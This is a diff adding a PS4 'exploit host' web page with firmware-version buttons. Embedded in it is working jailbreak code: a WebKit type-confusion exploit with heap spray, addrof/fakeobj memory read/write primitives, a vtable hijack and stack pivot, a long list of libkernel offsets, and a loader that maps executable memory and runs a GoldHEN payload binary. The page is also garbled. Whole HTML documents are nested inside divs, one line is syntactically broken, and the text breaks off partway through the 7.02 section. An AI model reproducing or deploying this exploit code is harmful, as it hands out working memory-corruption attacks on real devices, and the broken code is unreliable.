@@ -1,0 +1,2726 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع الأزرار - PS4 Hosts</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+        }
+        .header {
+            text-align: center;
+            padding: 20px;
+            background-color: #333;
+            color: white;
+        }
+        .buttons-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 250px;
+            transition: all 0.3s;
+        }
+        #btn505 {
+            background-color: #e74c3c;
+        }
+        #btn672 {
+            background-color: #3498db;
+        }
+        #btn702 {
+            background-color: #2ecc71;
+        }
+        #btn750 {
+            background-color: #f39c12;
+        }
+        #btn900 {
+            background-color: #9b59b6;
+        }
+        button:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        .content {
+            display: none;
+            padding: 20px;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-top: 20px;
+        }
+        .back-btn {
+            display: block;
+            margin: 20px auto;
+            padding: 10px 20px;
+            background-color: #333;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>PS4 Exploit Host</h1>
+        <p>اختر إصدار النظام المناسب لجهازك</p>
+    </div>
+    
+    <div class="buttons-container">
+        <button id="btn505">5.05</button>
+        <button id="btn672">6.72</button>
+        <button id="btn702">7.02</button>
+        <button id="btn750">7.50 - 7.55</button>
+        <button id="btn900">9.00</button>
+    </div>
+
+    <div id="content505" class="content">
+        <!-- محتوى PS4 5.05 FW GoldHEN -->
+        <!DOCTYPE html>
+        <html manifest="cache.manifest">
+        <head>
+        <title>PS4 5.05 FW GoldHEN Host by GamerHack</title>
+        <link rel="stylesheet" href="../style.css">
+        <script src="exploit.js"></script>
+        </head>
+        <body onload="if(localStorage.cached505=='yes')setTimeout(exploit, 50);">
+        <script>
+        window.applicationCache.onprogress=function(a){document.getElementById("msgs2").innerHTML="Installing Offline Cache: "+(Math.round(100*(a.loaded/a.total)))+"%"};
+        window.applicationCache.oncached=function(){setTimeout(function(){document.getElementById("msgs2").innerHTML="Cache Installed Successfully ✔";},1500);setTimeout(function(){document.getElementById("msgs2").innerHTML="Now Close And Re-Open Your Browser ..."; },3500);localStorage.cached505="yes";};
+        window.applicationCache.onnoupdate=function(){localStorage.cached505="yes";};
+        window.applicationCache.onerror=function(){localStorage.cached505="yes";};
+        </script>
+        <h1 id="msgs">PS4 5.05 FW GoldHEN Host by GamerHack</h1>
+        <hr>
+        <br>
+        <h1 id="msgs2" style="font-size: 30px;margin-top: 77px;margin-bottom: 455px;">Loading GoldHEN v2.4b18.3... Please Wait</h1>
+        <h1 style="margin-top: 105px;">Special Thanks to:<a href="https://twitter.com/_AlAzif" style="color: #f31414;margin-left: 10px;margin-right: 10px;">@_AlAzif</a>Leeful<a href="https://twitter.com/SpecterDev" style="color: #f31414;margin-left: 10px;margin-right: 10px;">@SpecterDev</a>SiSTR0<a href="https://twitter.com/Prb29327239" style="color: #f31414;margin-left: 10px;margin-right: 10px;">@Prb29327239</a></h1>
+        <script>
+        function allset(){
+        msgs2.innerHTML = LoadedMSG
+        }
+
+        function load_payload(){
+        req1=null;
+        var req1=new XMLHttpRequest();
+        req1.open('GET',PLfile);req1.responseType="arraybuffer";
+        req1.send();
+         req1.onreadystatechange=function(){
+          if (req1.readyState==4){
+           var padding1=new Uint8Array(4 - (req1.response.byteLength % 4) % 4);
+           var tmp1=new Uint8Array(req1.response.byteLength + padding1.byteLength);
+           tmp1.set(new Uint8Array(req1.response),0);
+           tmp1.set(padding1,req1.response.byteLength);
+           var shellcode1=new Uint32Array(tmp1.buffer);
+           var code_addr1=new int64(0x26100000,0x00000009);
+           p.syscall(477,code_addr1,0x300000,7,0x41000,-1,0);
+            for(var i=0;i < shellcode1.length; i++){
+            p.write4(code_addr1.add32(0x100000 + i * 4),shellcode1[i]);
+            }
+           runPAYLOAD1=function(){
+           p.fcall(code_addr1);
+           PLfile=null;
+            for(var x=0;x < 0x300000;x += 8){
+            p.write8(code_addr1.add32(x),0);}
+            };
+            allset();
+           setTimeout(runPAYLOAD1,100);
+          }
+         };
+        }
+
+        function success(){
+        LoadedMSG = "<h1 style='font-size:30px;'>GoldHEN v2.4b18.3 Loaded ✔</h1>";
+        PLfile = "goldhen_2.4b18.3.bin";
+        load_payload();
+        }
+        </script>
+        </body>
+        </html>
+        <button class="back-btn" onclick="hideContent('content505')">العودة إلى القائمة الرئيسية</button>
+    </div>
+
+    <div id="content672" class="content">
+        <h2>6.72 Exploit Host</h2>
+        <p>PS4 6.72 FW GOLDHEN</p>
+<!DOCTYPE html>
+<html manifest="cache.manifest">
+    <head>
+        <title>PS4 6.72 FW GoldHEN Host by GamerHack</title>
+        <link rel="stylesheet" href="../style.css">
+        <script src="jb.js"></script>
+    </head>
+    <body onload="if(localStorage.cached672=='yes')setTimeout(load_goldhen, 50);">
+        <script>
+            window.applicationCache.onprogress = function(a) {
+                document.getElementById("msgs").innerHTML = "Installing Offline Cache: " + (Math.round(100 * (a.loaded / a.total))) + "%"
+            }
+            ;
+            window.applicationCache.oncached = function() {
+                setTimeout(function() {
+                    document.getElementById("msgs").innerHTML = "Cache Installed Successfully ✔";
+                }, 1500);
+                setTimeout(function() {
+                    document.getElementById("msgs").innerHTML = "Now Close And Re-Open Your Browser ...";
+                }, 3500);
+                localStorage.cached672 = "yes";
+            }
+            ;
+            window.applicationCache.onnoupdate = function() {
+                localStorage.cached672 = "yes";
+            }
+            ;
+            window.applicationCache.onerror = function() {
+                localStorage.cached672 = "yes";
+            }
+            ;
+            var leaker_obj = {
+                a: 0
+            };
+            var leaker_arr = new Uint32Array(6);
+            var oob_slave = new Uint8Array(1024);
+            var oob_master = new Uint32Array(7);
+            var spray = [];
+            function spray_one() {
+                var x = new Uint32Array(1);
+                x[spray.length + 'spray'] = 123;
+                spray.push(x);
+            }
+            for (var i = 0; i < 0x10000; i++)
+                spray_one();
+            var target = {
+                a: 2.1100820415101592e-303,
+                b: false,
+                c: true,
+                d: 5678
+            };
+            var target2 = {
+                a: 2.1100820415101592e-303,
+                b: false,
+                c: true,
+                e: 5678
+            };
+            var impl_idx = 0;
+            function create_impl() {
+                var ans = {
+                    a: target
+                };
+                for (var i = 0; i < 32; i++)
+                    ans[(impl_idx++) + 'x'] = {};
+                return ans;
+            }
+            function trigger(x) {
+                if (impl.a != target) {
+                    print("wtf?");
+                    while (1)
+                        ;
+                }
+                var o = {
+                    a: 1
+                };
+                for (var i in o) {
+                    {
+                        i = x;
+                        function i() {}
+                        ;
+                    }
+                    o[i];
+                }
+                if (impl.a != target) {
+                    print("corrupted!");
+                    print(typeof (impl.a));
+                    print(impl.a.length);
+                    target.c = leaker_obj;
+                    leaker_obj.a = leaker_obj;
+                    var l1 = impl.a[4];
+                    var l2 = impl.a[5];
+                    leaker_obj.a = oob_slave;
+                    var s1 = impl.a[4];
+                    var s2 = impl.a[5];
+                    target.c = leaker_arr;
+                    impl.a[4] = l1;
+                    impl.a[5] = l2;
+                    target.c = oob_master;
+                    impl.a[4] = s1;
+                    impl.a[5] = s2;
+                    impl.a = target;
+                    print([l1, l2, s1, s2]);
+                    throw "exploit fucking finished";
+                }
+            }
+            try {
+                for (var _ = 0; _ < 1024; _++) {
+                    var impl = create_impl();
+                    var s = {
+                        a: impl
+                    };
+                    trigger(s);
+                }
+            } catch (e) {
+                print("error: " + e);
+            }
+            function i48_put(x, a) {
+                a[4] = x | 0;
+                a[5] = (x / 4294967296) | 0;
+            }
+            function i48_get(a) {
+                return a[4] + a[5] * 4294967296;
+            }
+            function addrof(x) {
+                leaker_obj.a = x;
+                return i48_get(leaker_arr);
+            }
+            function fakeobj(x) {
+                i48_put(x, leaker_arr);
+                return leaker_obj.a;
+            }
+            function read_mem_setup(p, sz) {
+                i48_put(p, oob_master);
+                oob_master[6] = sz;
+            }
+            function read_mem(p, sz) {
+                read_mem_setup(p, sz);
+                var arr = [];
+                for (var i = 0; i < sz; i++)
+                    arr.push(oob_slave[i]);
+                return arr;
+            }
+            function read_mem_s(p, sz) {
+                read_mem_setup(p, sz);
+                return "" + oob_slave;
+            }
+            function read_mem_b(p, sz) {
+                read_mem_setup(p, sz);
+                var b = new Uint8Array(sz);
+                b.set(oob_slave);
+                return b;
+            }
+            function read_mem_as_string(p, sz) {
+                var x = read_mem_b(p, sz);
+                var ans = '';
+                for (var i = 0; i < x.length; i++)
+                    ans += String.fromCharCode(x[i]);
+                return ans;
+            }
+            function write_mem(p, data) {
+                i48_put(p, oob_master);
+                oob_master[6] = data.length;
+                for (var i = 0; i < data.length; i++)
+                    oob_slave[i] = data[i];
+            }
+            function read_ptr_at(p) {
+                var ans = 0;
+                var d = read_mem(p, 8);
+                for (var i = 7; i >= 0; i--)
+                    ans = 256 * ans + d[i];
+                return ans;
+            }
+            function write_ptr_at(p, d) {
+                var arr = [];
+                for (var i = 0; i < 8; i++) {
+                    arr.push(d & 0xff);
+                    d /= 256;
+                }
+                write_mem(p, arr);
+            }
+            function hex(x) {
+                return (new Number(x)).toString(16);
+            }
+            var malloc_nogc = [];
+            function malloc(sz) {
+                var arr = new Uint8Array(sz);
+                malloc_nogc.push(arr);
+                return read_ptr_at(addrof(arr) + 0x10);
+            }
+            var tarea = document.createElement('textarea');
+            var real_vt_ptr = read_ptr_at(addrof(tarea) + 0x18);
+            var fake_vt_ptr = malloc(0x400);
+            write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
+            var real_vtable = read_ptr_at(fake_vt_ptr);
+            var fake_vtable = malloc(0x2000);
+            write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
+            write_ptr_at(fake_vt_ptr, fake_vtable);
+            var fake_vt_ptr_bak = malloc(0x400);
+            write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
+            var plt_ptr = read_ptr_at(fake_vtable) - 10063176;
+            function get_got_addr(idx) {
+                var p = plt_ptr + idx * 16;
+                var q = read_mem(p, 6);
+                if (q[0] != 0xff || q[1] != 0x25)
+                    throw "invalid GOT entry";
+                var offset = 0;
+                for (var i = 5; i >= 2; i--)
+                    offset = offset * 256 + q[i];
+                offset += p + 6;
+                return read_ptr_at(offset);
+            }
+            var webkit_base = read_ptr_at(fake_vtable);
+            var libkernel_base = get_got_addr(705) - 0x10000;
+            var libc_base = get_got_addr(582);
+            var saveall_addr = libc_base + 0x2e2c8;
+            var loadall_addr = libc_base + 0x3275c;
+            var setjmp_addr = libc_base + 0xbfae0;
+            var longjmp_addr = libc_base + 0xbfb30;
+            var pivot_addr = libc_base + 0x327d2;
+            var infloop_addr = libc_base + 0x447a0;
+            var jop_frame_addr = libc_base + 0x715d0;
+            var get_errno_addr_addr = libkernel_base + 0x9ff0;
+            var pthread_create_addr = libkernel_base + 0xf980;
+            function saveall() {
+                var ans = malloc(0x800);
+                var bak = read_ptr_at(fake_vtable + 0x1d8);
+                write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+                write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
+                tarea.scrollLeft = 0;
+                write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
+                write_mem(ans, read_mem(fake_vt_ptr, 0x400));
+                write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+                var bak = read_ptr_at(fake_vtable + 0x1d8);
+                write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+                write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
+                write_ptr_ataddroftarea + 0x18,
+                fake_vt_ptr;
+                tarea.scrollLeft = 0;
+                write_ptr_ataddroftarea + 0x18,
+                real_vt_ptr;
+                write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
+                write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+                return ans;
+            }
+            function pivot(buf) {
+                var ans = malloc(0x400);
+                var bak = read_ptr_at(fake_vtable + 0x1d8);
+                write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+                write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
+                tarea.scrollLeft = 0;
+                write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
+                write_mem(ans, read_mem(fake_vt_ptr, 0x400));
+                write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+                var bak = read_ptr_at(fake_vtable + 0x1d8);
+                write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
+                write_ptr_at(fake_vt_ptr + 0x38, buf);
+                write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
+                write_ptr_at(buf, ans);
+                write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
+                tarea.scrollLeft = 0;
+                write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
+                write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+            }
+            var aio_init_addr = libkernel_base + 126912
+              , fpathconf_addr = libkernel_base + 126944
+              , dmem_container_addr = libkernel_base + 126976
+              , evf_clear_addr = libkernel_base + 127008
+              , kqueue_addr = libkernel_base + 127040
+              , kevent_addr = libkernel_base + 127072
+              , futimes_addr = libkernel_base + 127104
+              , open_addr = libkernel_base + 127136
+              , thr_self_addr = libkernel_base + 127168
+              , mkdir_addr = libkernel_base + 127200
+              , pipe_addr = libkernel_base + 127232
+              , stat_addr = libkernel_base + 127280
+              , write_addr = libkernel_base + 127312
+              , evf_cancel_addr = libkernel_base + 127344
+              , ktimer_delete_addr = libkernel_base + 127376
+              , setregid_addr = libkernel_base + 127408
+              , jitshm_create_addr = libkernel_base + 127440
+              , sigwait_addr = libkernel_base + 127472
+              , fdatasync_addr = libkernel_base + 127504
+              , sigtimedwait_addr = libkernel_base + 127536
+              , get_gpo_addr = libkernel_base + 127568
+              , sched_setscheduler_addr = libkernel_base + 127600
+              , osem_open_addr = libkernel_base + 127632
+              , dynlib_get_info_addr = libkernel_base + 127664
+              , osem_post_addr = libkernel_base + 127712
+              , blockpool_move_addr = libkernel_base + 127744
+              , issetugid_addr = libkernel_base + 127776
+              , getdents_addr = libkernel_base + 127808
+              , rtprio_thread_addr = libkernel_base + 127840
+              , evf_delete_addr = libkernel_base + 127872
+              , _umtx_op_addr = libkernel_base + 127904
+              , access_addr = libkernel_base + 127936
+              , reboot_addr = libkernel_base + 127968
+              , sigaltstack_addr = libkernel_base + 128e3
+              , getcontext_addr = libkernel_base + 128036
+              , munmap_addr = libkernel_base + 128080
+              , setuid_addr = libkernel_base + 128112
+              , evf_trywait_addr = libkernel_base + 128144
+              , setcontext_addr = libkernel_base + 128176
+              , dynlib_get_list_addr = libkernel_base + 128208
+              , setsid_addr = libkernel_base + 128240
+              , fstatfs_addr = libkernel_base + 128272
+              , aio_multi_wait_addr = libkernel_base + 128304
+              , accept_addr = libkernel_base + 128336
+              , set_phys_fmem_limit_addr = libkernel_base + 128368
+              , thr_get_name_addr = libkernel_base + 128400
+              , get_page_table_stats_addr = libkernel_base + 128432
+              , sigsuspend_addr = libkernel_base + 128464
+              , truncate_addr = libkernel_base + 128496
+              , fsync_addr = libkernel_base + 128528
+              , execve_addr = libkernel_base + 128573
+              , evf_open_addr = libkernel_base + 128608
+              , netabort_addr = libkernel_base + 128640
+              , blockpool_unmap_addr = libkernel_base + 128672
+              , osem_create_addr = libkernel_base + 128704
+              , getlogin_addr = libkernel_base + 128736
+              , mincore_addr = libkernel_base + 128768
+              , shutdown_addr = libkernel_base + 128800
+              , profil_addr = libkernel_base + 128832
+              , preadv_addr = libkernel_base + 128864
+              , geteuid_addr = libkernel_base + 128896
+              , set_chicken_switches_addr = libkernel_base + 128928
+              , sigqueue_addr = libkernel_base + 128960
+              , aio_multi_poll_addr = libkernel_base + 128992
+              , get_self_auth_info_addr = libkernel_base + 129024
+              , opmc_enable_addr = libkernel_base + 129056
+              , aio_multi_delete_addr = libkernel_base + 129088
+              , rfork_addr = libkernel_base + 129129
+              , sys_exit_addr = libkernel_base + 129162
+              , blockpool_batch_addr = libkernel_base + 129200
+              , sigpending_addr = libkernel_base + 129232
+              , ktimer_gettime_addr = libkernel_base + 129264
+              , opmc_set_ctr_addr = libkernel_base + 129296
+              , ksem_wait_addr = libkernel_base + 129328
+              , sched_getparam_addr = libkernel_base + 129360
+              , swapcontext_addr = libkernel_base + 129392
+              , opmc_get_ctr_addr = libkernel_base + 129424
+              , budget_get_ptype_addr = libkernel_base + 129456
+              , msync_addr = libkernel_base + 129488
+              , sigwaitinfo_addr = libkernel_base + 129520
+              , lstat_addr = libkernel_base + 129552
+              , test_debug_rwmem_addr = libkernel_base + 129584
+              , evf_create_addr = libkernel_base + 129616
+              , madvise_addr = libkernel_base + 129648
+              , cpuset_getaffinity_addr = libkernel_base + 129680
+              , evf_set_addr = libkernel_base + 129712
+              , setlogin_addr = libkernel_base + 129744
+              , ksem_init_addr = libkernel_base + 129792
+              , opmc_disable_addr = libkernel_base + 129824
+              , namedobj_delete_addr = libkernel_base + 129856
+              , gettimeofday_addr = libkernel_base + 129888
+              , read_addr = libkernel_base + 129920
+              , thr_get_ucontext_addr = libkernel_base + 129952
+              , batch_map_addr = libkernel_base + 129984
+              , sysarch_addr = libkernel_base + 130016
+              , utc_to_localtime_addr = libkernel_base + 130048
+              , evf_close_addr = libkernel_base + 130080
+              , setrlimit_addr = libkernel_base + 130112
+              , getpeername_addr = libkernel_base + 130144
+              , aio_get_data_addr = libkernel_base + 130176
+              , lseek_addr = libkernel_base + 130208
+              , connect_addr = libkernel_base + 130240
+              , recvfrom_addr = libkernel_base + 130272
+              , getrlimit_addr = libkernel_base + 130304
+              , dynlib_get_info_for_libdbg_addr = libkernel_base + 130336
+              , thr_suspend_ucontext_addr = libkernel_base + 130368
+              , _umtx_op_addr = libkernel_base + 130400
+              , kill_addr = libkernel_base + 130416
+              , dynlib_process_needed_and_relocate_addr = libkernel_base + 130448
+              , getsockname_addr = libkernel_base + 130480
+              , osem_trywait_addr = libkernel_base + 130512
+              , execve_addr = libkernel_base + 130544
+              , flock_addr = libkernel_base + 130576
+              , sigreturn_addr = libkernel_base + 130608
+              , query_memory_protection_addr = libkernel_base + 130640
+              , pwrite_addr = libkernel_base + 130672
+              , get_map_statistics_addr = libkernel_base + 130704
+              , ksem_getvalue_addr = libkernel_base + 130736
+              , sendfile_addr = libkernel_base + 130768
+              , socketex_addr = libkernel_base + 130800
+              , unlink_addr = libkernel_base + 130832
+              , thr_resume_ucontext_addr = libkernel_base + 130864
+              , dl_get_list_addr = libkernel_base + 130896
+              , cpuset_setaffinity_addr = libkernel_base + 130928
+              , clock_gettime_addr = libkernel_base + 130960
+              , thr_kill2_addr = libkernel_base + 130992
+              , set_timezone_info_addr = libkernel_base + 131024
+              , select_addr = libkernel_base + 131056
+              , pselect_addr = libkernel_base + 131088
+              , sync_addr = libkernel_base + 131120
+              , socketpair_addr = libkernel_base + 131152
+              , get_kernel_mem_statistics_addr = libkernel_base + 131184
+              , virtual_query_all_addr = libkernel_base + 131216
+              , physhm_open_addr = libkernel_base + 131248
+              , getuid_addr = libkernel_base + 131280
+              , revoke_addr = libkernel_base + 131312
+              , sigprocmask_addr = libkernel_base + 131347
+              , setegid_addr = libkernel_base + 131488
+              , cpuset_getid_addr = libkernel_base + 131520
+              , evf_wait_addr = libkernel_base + 131552
+              , sched_get_priority_max_addr = libkernel_base + 131584
+              , sigaction_addr = libkernel_base + 131616
+              , ipmimgr_call_addr = libkernel_base + 131648
+              , aio_submit_cmd_addr = libkernel_base + 131680
+              , free_stack_addr = libkernel_base + 131712
+              , settimeofday_addr = libkernel_base + 131744
+              , recvmsg_addr = libkernel_base + 131776
+              , aio_submit_addr = libkernel_base + 131808
+              , setgroups_addr = libkernel_base + 131840
+              , aio_multi_cancel_addr = libkernel_base + 131872
+              , nanosleep_addr = libkernel_base + 131904
+              , blockpool_map_addr = libkernel_base + 131936
+              , thr_create_addr = libkernel_base + 131968
+              , munlockall_addr = libkernel_base + 132e3
+              , dynlib_get_info_ex_addr = libkernel_base + 132032
+              , pwritev_addr = libkernel_base + 132064
+              , mname_addr = libkernel_base + 132096
+              , regmgr_call_addr = libkernel_base + 132128
+              , getgroups_addr = libkernel_base + 132160
+              , osem_close_addr = libkernel_base + 132192
+              , osem_delete_addr = libkernel_base + 132224
+              , dynlib_get_obj_member_addr = libkernel_base + 132256
+              , debug_init_addr = libkernel_base + 132288
+              , mmap_dmem_addr = libkernel_base + 132320
+              , kldunloadf_addr = libkernel_base + 132352
+              , mprotect_addr = libkernel_base + 132384
+              , ksem_trywait_addr = libkernel_base + 132592
+              , ksem_close_addr = libkernel_base + 132624
+              , sched_rr_get_interval_addr = libkernel_base + 132656
+              , getitimer_addr = libkernel_base + 132688
+              , getpid_addr = libkernel_base + 132720
+              , netgetsockinfo_addr = libkernel_base + 132752
+              , get_cpu_usage_all_addr = libkernel_base + 132784
+              , eport_delete_addr = libkernel_base + 132816
+              , randomized_path_addr = libkernel_base + 132848
+              , jitshm_alias_addr = libkernel_base + 132880
+              , seteuid_addr = libkernel_base + 132912
+              , set_uevt_addr = libkernel_base + 132944
+              , clock_getres_addr = libkernel_base + 132976
+              , setitimer_addr = libkernel_base + 133008
+              , thr_exit_addr = libkernel_base + 133040
+              , sandbox_path_addr = libkernel_base + 133072
+              , thr_kill_addr = libkernel_base + 133104
+              , sys_exit_addr = libkernel_base + 133136
+              , dup2_addr = libkernel_base + 133168
+              , utimes_addr = libkernel_base + 133200
+              , pread_addr = libkernel_base + 133232
+              , dl_get_info_addr = libkernel_base + 133264
+              , ktimer_settime_addr = libkernel_base + 133296
+              , sched_setparam_addr = libkernel_base + 133328
+              , aio_create_addr = libkernel_base + 133360
+              , osem_wait_addr = libkernel_base + 133392
+              , dynlib_get_list_for_libdbg_addr = libkernel_base + 133424
+              , get_proc_type_info_addr = libkernel_base + 133456
+              , getgid_addr = libkernel_base + 133488
+              , fstat_addr = libkernel_base + 133520
+              , fork_addr = libkernel_base + 133552
+              , namedobj_create_addr = libkernel_base + 133584
+              , opmc_set_ctl_addr = libkernel_base + 133616
+              , get_resident_count_addr = libkernel_base + 133648
+              , getdirentries_addr = libkernel_base + 133680
+              , getrusage_addr = libkernel_base + 133712
+              , setreuid_addr = libkernel_base + 133744
+              , wait4_addr = libkernel_base + 133776
+              , __sysctl_addr = libkernel_base + 133808
+              , bind_addr = libkernel_base + 133840
+              , sched_yield_addr = libkernel_base + 133872
+              , dl_get_metadata_addr = libkernel_base + 133904
+              , get_resident_fmem_count_addr = libkernel_base + 133936
+              , setsockopt_addr = libkernel_base + 133968
+              , dynlib_load_prx_addr = libkernel_base + 134e3
+              , getpriority_addr = libkernel_base + 134032
+              , get_phys_page_size_addr = libkernel_base + 134064
+              , opmc_set_hw_addr = libkernel_base + 134096
+              , dynlib_do_copy_relocations_addr = libkernel_base + 134128
+              , netcontrol_addr = libkernel_base + 134160
+              , ksem_post_addr = libkernel_base + 134192
+              , netgetiflist_addr = libkernel_base + 134224
+              , chmod_addr = libkernel_base + 134256
+              , aio_suspend_addr = libkernel_base + 134288
+              , ksem_timedwait_addr = libkernel_base + 134320
+              , dynlib_dlsym_addr = libkernel_base + 134352
+              , get_paging_stats_of_all_objects_addr = libkernel_base + 134384
+              , osem_cancel_addr = libkernel_base + 134416
+              , writev_addr = libkernel_base + 134448
+              , ktimer_getoverrun_addr = libkernel_base + 134480
+              , rmdir_addr = libkernel_base + 134512
+              , sched_get_priority_min_addr = libkernel_base + 134544
+              , dynlib_unload_prx_addr = libkernel_base + 134576
+              , thr_set_name_addr = libkernel_base + 134608
+              , mlockall_addr = libkernel_base + 134640
+              , openat_addr = libkernel_base + 134672
+              , eport_open_addr = libkernel_base + 134704
+              , sigprocmask_addr = libkernel_base + 134736
+              , chdir_addr = libkernel_base + 134768
+              , physhm_unlink_addr = libkernel_base + 134800
+              , mtypeprotect_addr = libkernel_base + 134832
+              , thr_wake_addr = libkernel_base + 134864
+              , blockpool_open_addr = libkernel_base + 134896
+              , thr_new_addr = libkernel_base + 134928
+              , munlock_addr = libkernel_base + 134960
+              , fchflags_addr = libkernel_base + 134992
+              , ftruncate_addr = libkernel_base + 135024
+              , rename_addr = libkernel_base + 135056
+              , poll_addr = libkernel_base + 135088
+              , eport_trigger_addr = libkernel_base + 135120
+              , getsid_addr = libkernel_base + 135152
+              , virtual_query_addr = libkernel_base + 135184
+              , fchmod_addr = libkernel_base + 135216
+              , _umtx_unlock_addr = libkernel_base + 135248
+              , mmap_addr = libkernel_base + 135280
+              , ktimer_create_addr = libkernel_base + 135312
+              , dup_addr = libkernel_base + 135344
+              , sendmsg_addr = libkernel_base + 135376
+              , close_addr = libkernel_base + 135408
+              , is_development_mode_addr = libkernel_base + 135440
+              , getegid_addr = libkernel_base + 135472
+              , get_vm_map_timestamp_addr = libkernel_base + 135504
+              , dynlib_get_proc_param_addr = libkernel_base + 135536
+              , fcntl_addr = libkernel_base + 135568
+              , getppid_addr = libkernel_base + 135600
+              , readv_addr = libkernel_base + 135632
+              , rdup_addr = libkernel_base + 135664
+              , listen_addr = libkernel_base + 135696
+              , app_state_change_addr = libkernel_base + 135728
+              , set_gpo_addr = libkernel_base + 135760
+              , ksem_unlink_addr = libkernel_base + 135792
+              , get_cpu_usage_proc_addr = libkernel_base + 135824
+              , shm_unlink_addr = libkernel_base + 135856
+              , reserve_2mb_page_addr = libkernel_base + 135888
+              , dynlib_get_info2_addr = libkernel_base + 135920
+              , mlock_addr = libkernel_base + 135952
+              , workaround8849_addr = libkernel_base + 135984
+              , get_sdk_compiled_version_addr = libkernel_base + 136016
+              , clock_settime_addr = libkernel_base + 136048
+              , ksem_destroy_addr = libkernel_base + 136080
+              , ksem_open_addr = libkernel_base + 136112
+              , thr_set_ucontext_addr = libkernel_base + 136144
+              , get_bio_usage_all_addr = libkernel_base + 136176
+              , getdtablesize_addr = libkernel_base + 136208
+              , chflags_addr = libkernel_base + 136240
+              , shm_open_addr = libkernel_base + 136272
+              , eport_close_addr = libkernel_base + 136304
+              , dynlib_get_list2_addr = libkernel_base + 136336
+              , socketclose_addr = libkernel_base + 136368
+              , sched_getscheduler_addr = libkernel_base + 136400
+              , pathconf_addr = libkernel_base + 136432
+              , localtime_to_utc_addr = libkernel_base + 136464
+              , setpriority_addr = libkernel_base + 136496
+              , cpumode_yield_addr = libkernel_base + 136528
+              , process_terminate_addr = libkernel_base + 136560
+              , ioctl_addr = libkernel_base + 136592
+              , opmc_get_hw_addr = libkernel_base + 136624
+              , eport_create_addr = libkernel_base + 136656
+              , socket_addr = libkernel_base + 136688
+              , _umtx_lock_addr = libkernel_base + 136720
+              , thr_suspend_addr = libkernel_base + 136752
+              , is_in_sandbox_addr = libkernel_base + 136784
+              , get_authinfo_addr = libkernel_base + 136816
+              , mdbg_service_addr = libkernel_base + 136848
+              , getsockopt_addr = libkernel_base + 136880
+              , get_paging_stats_of_all_threads_addr = libkernel_base + 136912
+              , adjtime_addr = libkernel_base + 136944
+              , kqueueex_addr = libkernel_base + 136976
+              , uuidgen_addr = libkernel_base + 137008
+              , set_vm_container_addr = libkernel_base + 137040
+              , sendto_addr = libkernel_base + 137072;
+        </script>
+        <h1>
+            <font color="green">
+                Pass = <span id="passCounter"></span>
+                &nbsp;&nbsp;&nbsp;&nbsp;<font color="white">PS4 6.72 FW GoldHEN Host by GamerHack
+</span>&nbsp;&nbsp;&nbsp;&nbsp;
+<font color="red">
+    Fail = <span id="failCounter"></span>
+</h1><hr>
+<br>
+<h1 id="msgs" style="font-size: 30px;margin-top: 77px;margin-bottom: 455px;">Loading GoldHEN v2.4b18.3... Please Wait</h1>
+<h1 style="margin-top: 43px;">
+    Special Thanks to:<a href="https://twitter.com/sleirsgoevy" style="color: #f31414;margin-left: 10px;margin-right: 10px;">@sleirsgoevy</a>
+    Leeful<a href="https://twitter.com/_AlAzif" style="color: #f31414;margin-left: 10px;">@_AlAzif</a>
+</h1>
+<script>
+    if (localStorage.passcount == null)
+        localStorage.passcount = 0;
+    window.passCounter.innerHTML = localStorage.passcount;
+    if (localStorage.failcount == null)
+        localStorage.failcount = 0;
+    window.failCounter.innerHTML = localStorage.failcount;
+
+    function load_goldhen() {
+        LoadedMSG = "GoldHEN v2.4b18.3 Loaded ...";
+        PLfile = "goldhen_2.4b18.3.bin";
+        setTimeout(jailbreak, 500);
+    }
+</script>
+</body></html>
+
+        <button class="back-btn" onclick="hideContent('content672')">العودة إلى القائمة الرئيسية</button>
+    </div>
+
+    <div id="content702" class="content">
+        <h2>7.02 Exploit Host</h2>
+        <p>PS4 7.02 FW GOLDHEN</p>
+<!DOCTYPE html>
+<html manifest="cache.manifest">
+<head>
+<title>PS4 7.02 FW Host v1.4 by GamerHack</title>
+<link rel="stylesheet" href="../style.css">
+<script>
+function DLProgress(e){Percent=(Math.round(e.loaded / e.total * 100));document.getElementById="display:none";window.msgs.innerHTML="Installing Offline Cache: " + Percent + "%";}
+function DisplayCacheProgress(){setTimeout(function(){window.msgs.innerHTML="Cache Installed Successfully ✔";},1000);setTimeout(function(){window.msgs.innerHTML="Now Close And Re-Open Your Browser ...";},3000);}window.applicationCache.addEventListener("progress",DLProgress,false);window.applicationCache.oncached=function(e){DisplayCacheProgress();};window.applicationCache.onupdateready=function(e){DisplayCacheProgress();};
